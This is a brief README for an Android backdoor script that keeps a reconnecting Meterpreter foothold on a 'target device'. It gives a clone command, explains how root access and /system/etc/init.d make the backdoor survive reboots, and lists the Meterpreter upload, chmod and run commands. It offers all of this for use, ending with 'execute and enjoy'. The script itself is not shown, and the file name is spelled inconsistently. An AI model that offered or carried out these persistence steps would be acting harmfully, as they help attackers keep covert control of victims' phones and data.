# My persistant android backdoor

## Installation
```
git clone https://github.com/derickmachaa/android-persistant.sh/
```
## Description
This scripts creates a persistent reconnecting backdoor on android phones  
when run this script is active until reboot on non-rooted devices
To make it persistent on reboot  
copy the persistant.sh in the /system/etc/init.d folder #N.B this requires root permission on device
## Implementation
This script is implemented using  metersploit
## Requirements
a running meterpreter session on target device
## Usage
upload the script in the device,execute and enjoy

Assume this is our meterpreter session  
```bash
meterpreter> upload persistent.sh  
meterpreter> shell   
chmod 755 persistent.sh  
./persistent.sh  
```

##Enjoy!

